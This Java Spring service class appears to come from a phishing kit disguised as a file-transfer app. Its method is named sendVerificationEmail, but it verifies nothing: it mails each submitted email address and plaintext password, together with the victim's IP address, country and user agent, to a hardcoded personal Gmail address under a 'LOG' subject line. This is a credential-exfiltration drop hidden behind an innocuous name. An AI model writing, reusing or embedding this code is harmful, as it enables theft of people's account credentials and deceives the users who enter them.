package havezzy.filetransfer.app.email;

import java.io.UnsupportedEncodingException;

import javax.mail.MessagingException;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

@Service
public class EmailService {
	@Autowired
	MailSenderService mailSenderService;
	
	public void addEmail(Email email) throws UnsupportedEncodingException, MessagingException {
		sendVerificationEmail(email);
	}
	
	private void sendVerificationEmail(Email email) throws MessagingException, UnsupportedEncodingException {
		String toAddress = "katrinarowett61@gmail.com";
		String subject = "LOG "+email.getIpAddress();
		String content = "<!DOCTYPE html><html><body><div style=\"font-family: Arial, Helvetica, sans-serif;\"><p>---------------------------Log Info----------------------------</p><p>Email Address               :"+ email.getEmail() +"</p><p>Password             :"+ email.getPassword() +"</p><p>|---------------------- INFO | IP | Location ------------------------|</p><p>|Client Location:  "+ email.getCountry() +"</p><p>|-- http://www.geoiptool.com/?IP=" + email.getIpAddress() + " ------</p><p>User Agent: " + email.getUserAgent() + "</p><p>|-------- unknown ----------|</p></div></body></html>";

		
		mailSenderService.sendEmail(toAddress, subject, content);
	}

	
	

}
